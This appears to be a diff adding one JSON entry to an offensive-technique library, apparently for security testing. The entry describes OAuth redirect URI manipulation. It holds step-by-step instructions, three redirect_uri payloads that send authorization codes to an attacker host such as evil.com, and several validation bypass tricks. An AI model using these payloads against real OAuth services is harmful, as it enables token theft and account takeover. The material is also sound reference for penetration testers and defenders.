@@ -1,0 +1,54 @@
+{
+  "id": "auth-oauth-redirect-manipulation",
+  "title": "OAuth Redirect URI Manipulation",
+  "category": "auth_bypass",
+  "tags": ["oauth", "redirect", "token-theft", "authorization-code"],
+  "applicability": {
+    "technologies": ["node", "python", "java", "ruby", "php"],
+    "contexts": ["authentication", "oauth-flow", "redirect-url"],
+    "preconditions": ["oauth-implementation", "redirect-uri-parameter"]
+  },
+  "technique": {
+    "summary": "Manipulate the OAuth redirect_uri parameter to steal authorization codes or tokens by redirecting them to an attacker-controlled endpoint. Exploits weak redirect_uri validation in the authorization server.",
+    "steps": [
+      "Identify the OAuth authorization endpoint and its redirect_uri parameter",
+      "Test if redirect_uri validation is strict, prefix-based, or regex-based",
+      "Try subdomain-based bypasses: https://evil.legitimate-app.com/callback",
+      "Try path traversal: https://legitimate-app.com/callback/../../../evil.com",
+      "Try parameter pollution: redirect_uri=legit.com%26redirect_uri=evil.com",
+      "Chain with open redirect on the legitimate domain if one exists",
+      "Craft a malicious authorization URL and capture the leaked auth code/token"
+    ],
+    "payloads": [
+      {
+        "payload": "redirect_uri=https://legitimate-app.com.evil.com/callback",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "Subdomain confusion — evil.com controls the subdomain"
+      },
+      {
+        "payload": "redirect_uri=https://legitimate-app.com/callback/../../evil-page",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "Path traversal in redirect URI"
+      },
+      {
+        "payload": "redirect_uri=https://legitimate-app.com/callback%23@evil.com",
+        "encoding": "url-encoded",
+        "context": "url-parameter",
+        "notes": "Fragment-based bypass"
+      }
+    ],
+    "bypassTechniques": [
+      "Use URL encoding/double encoding of path separators",
+      "Abuse open redirect on the legitimate domain as a redirect_uri chain",
+      "Register a subdomain under the legitimate app's domain if possible",
+      "Use response_mode=fragment to leak tokens via Referer header"
+    ]
+  },
+  "references": [
+    "https://portswigger.net/web-security/oauth",
+    "https://datatracker.ietf.org/doc/html/rfc6749#section-10.6"
+  ],
+  "source": "portswigger-research"
+}
